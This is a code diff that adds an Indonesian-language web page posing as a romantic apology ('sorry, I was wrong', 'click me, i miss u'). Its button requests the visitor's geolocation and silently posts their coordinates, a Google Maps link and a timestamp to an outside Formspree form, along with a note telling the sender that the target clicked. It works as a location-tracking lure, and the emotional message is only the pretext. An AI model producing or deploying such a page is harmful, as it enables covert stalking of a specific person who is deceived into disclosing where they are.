@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Untuk Kamu ❤️</title>
+
+<style>
+body {
+    font-family: sans-serif;
+    text-align: center;
+    padding: 60px 20px;
+    background: linear-gradient(to bottom, #fff0f5, #ffe4ec);
+}
+
+h1 {
+    color: #d6336c;
+}
+
+p {
+    font-size: 18px;
+}
+
+button {
+    padding: 14px 30px;
+    font-size: 16px;
+    border: none;
+    border-radius: 10px;
+    background-color: #ff4d6d;
+    color: white;
+    cursor: pointer;
+    margin-top: 20px;
+    transition: 0.3s;
+}
+
+button:hover {
+    background-color: #e63956;
+}
+
+#status {
+    margin-top: 20px;
+    font-weight: bold;
+    color: #444;
+}
+</style>
+</head>
+
+<body>
+
+<h1>Hai apa kabar, maaf ya aku salah ❤️</h1>
+<p>Klik aku ya, i miss u 💕</p>
+
+<button onclick="getLocation()">Klik Aku</button>
+
+<p style="font-size:12px; margin-top:15px;">
+Dengan klik tombol ini kamu mengizinkan akses lokasi.
+</p>
+
+<div id="status"></div>
+
+<script>
+function getLocation() {
+    const status = document.getElementById("status");
+    status.innerHTML = "Meminta izin lokasi...";
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+    } else {
+        status.innerHTML = "Browser tidak mendukung geolocation.";
+    }
+}
+
+function sendLocation(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    const formData = new FormData();
+    formData.append("latitude", lat);
+    formData.append("longitude", lon);
+    formData.append("google_maps_link", "https://www.google.com/maps?q=" + lat + "," + lon);
+    formData.append("waktu", new Date().toLocaleString());
+    formData.append("pesan", "Dia klik tombol i miss u ❤️");
+
+    fetch("https://formspree.io/f/xpqjkyaa", {
+        method: "POST",
+        body: formData,
+        headers: {
+            'Accept': 'application/json'
+        }
+    })
+    .then(response => {
+        if (response.ok) {
+            document.getElementById("status").innerHTML = "Terima kasih sudah klik ❤️";
+        } else {
+            document.getElementById("status").innerHTML = "Gagal mengirim lokasi.";
+        }
+    })
+    .catch(() => {
+        document.getElementById("status").innerHTML = "Terjadi kesalahan saat mengirim.";
+    });
+}
+
+function showError(error) {
+    const status = document.getElementById("status");
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            status.innerHTML = "Izin lokasi ditolak.";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            status.innerHTML = "Lokasi tidak tersedia.";
+            break;
+        case error.TIMEOUT:
+            status.innerHTML = "Permintaan lokasi timeout.";
+            break;
+        default:
+            status.innerHTML = "Terjadi kesalahan.";
+            break;
+    }
+}
+</script>
+
+</body>
+</html>
